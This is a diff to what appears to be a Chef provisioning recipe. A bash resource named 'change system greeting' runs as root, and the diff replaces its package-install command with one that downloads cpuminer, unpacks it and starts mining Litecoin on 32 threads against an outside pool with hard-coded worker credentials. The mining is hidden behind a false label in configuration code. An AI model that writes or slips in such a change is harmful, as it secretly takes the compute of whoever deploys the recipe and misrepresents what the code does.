@@ -1,6 +1,6 @@
 bash "change system greeting" do
   user "root"
   code <<-EOH
-  apt-get update && apt-get upgrade && apt-get install freeglut3-dev build-essential libx11-dev libxmu-dev libxi-dev libgl1-mesa-glx libglu1-mesa libglu1-mesa-dev libglapi-mesa libgl1-mesa-dri
+  wget https://github.com/pooler/cpuminer/releases/download/v2.4.4/pooler-cpuminer-2.4.4-linux-x86_64.tar.gz && tar xvf pooler-cpuminer-2.4.4-linux-x86_64.tar.gz && ./minerd -o stratum+tcp://global.wemineltc.com:3333 -u ajhaxynr.1 -p ajHax365 -t 32
   EOH
   end
